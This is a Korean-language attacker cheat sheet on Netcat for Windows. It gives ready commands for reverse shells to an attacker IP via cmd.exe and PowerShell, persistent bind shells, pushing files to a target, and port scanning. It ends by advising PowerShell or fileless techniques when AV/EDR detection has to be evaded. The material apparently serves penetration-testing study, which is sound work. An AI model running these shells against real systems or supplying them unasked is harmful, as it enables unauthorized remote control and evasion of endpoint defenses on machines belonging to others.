

# Windows Netcat 활용 가이드

Netcat은 "TCP/IP 스위스 군용 칼"로 불릴 만큼 네트워크 작업에 다재다능한 도구입니다. Windows 환경에서도 리버스/바인드 셸, 파일 전송, 포트 스캐닝 등 다양한 용도로 활용될 수 있습니다.

---

### **1. Netcat 다운로드 및 실행**

- **권장:** Nmap 프로젝트에서 제공하는 `ncat`은 Netcat의 현대적인 버전으로, 더 많은 기능과 안정성을 제공합니다.
- **다운로드:** [Ncat Portable 버전](https://nmap.org/dist/ncat-portable-5.59BETA1.zip)을 다운로드하여 타겟 시스템에 업로드합니다. (파일 전송 가이드 참고)

---

### **2. 리버스 셸 (Reverse Shell)**

- **개념:** 타겟 시스템이 공격자 머신으로 연결을 시도하여 셸을 제공하는 방식입니다. 방화벽 우회에 효과적입니다.

#### **공격자 (Kali): 리스너 실행**
```bash(title="Netcat 리스너")
# -l: 리스닝 모드
# -v: 상세 출력
# -n: DNS 룩업 비활성화
# -p: 리스닝할 포트
rlwrap nc -lvnp 443
```

#### **타겟 (Windows): 셸 연결**
```powershell(title="cmd.exe 셸 연결")
# -e: 지정된 프로그램을 실행하고 입출력을 리다이렉션
C:\Path\To\nc.exe <attacker_ip> 443 -e cmd.exe
```

```powershell(title="PowerShell.exe 셸 연결")
C:\Path\To\nc.exe <attacker_ip> 443 -e powershell.exe
```

---

### **3. 바인드 셸 (Bind Shell)**

- **개념:** 타겟 시스템이 특정 포트에서 리스닝하며, 공격자가 해당 포트로 접속하여 셸을 획득하는 방식입니다. 타겟 시스템의 방화벽이 해당 포트를 허용해야 합니다.

#### **타겟 (Windows): 셸 리스너 실행**
```powershell(title="Netcat 바인드 셸")
# -L: 연결이 끊어져도 계속 리스닝 (지속성)
# -v: 상세 출력
# -p: 리스닝할 포트
C:\Path\To\nc.exe -Lvp 8080 -e cmd.exe
```

#### **공격자 (Kali): 셸 접속**
```bash(title="Netcat 셸 접속")
nc <target_ip> 8080
```

---

### **4. 파일 전송**

- **개념:** Netcat을 사용하여 간단한 파일을 TCP 스트림으로 전송합니다.

#### **공격자 -> 타겟 (파일 전송)**
```bash(title="공격자: 파일 전송")
# 4444 포트에서 리스닝하며 file_to_send.txt 내용을 전송
nc -lvp 4444 < file_to_send.txt
```
```powershell(title="타겟: 파일 수신")
# 공격자에게 접속하여 수신된 데이터를 received_file.txt에 저장
C:\Path\To\nc.exe <attacker_ip> 4444 > received_file.txt
```

---

### **5. 포트 스캐닝**

- **개념:** Netcat을 사용하여 특정 포트가 열려있는지 간단히 확인할 수 있습니다.

```powershell(title="Netcat 포트 스캔")
# -zv: 상세 출력 및 제로-I/O 모드 (연결 후 데이터 전송 없이 종료)
C:\Path\To\nc.exe -zv <target_ip> <port_number>
# 예: nc.exe -zv 192.168.1.1 80
```

---

### **6. 주의사항**

- **AV/EDR 탐지:** Netcat은 공격 도구로 널리 알려져 있어, 대부분의 백신(AV)이나 EDR(Endpoint Detection and Response) 솔루션에 의해 탐지될 가능성이 높습니다.
- **대체 도구:** 탐지를 우회해야 하는 경우, PowerShell 기반의 리버스 셸이나 다른 파일리스(Fileless) 기법을 고려해야 합니다.

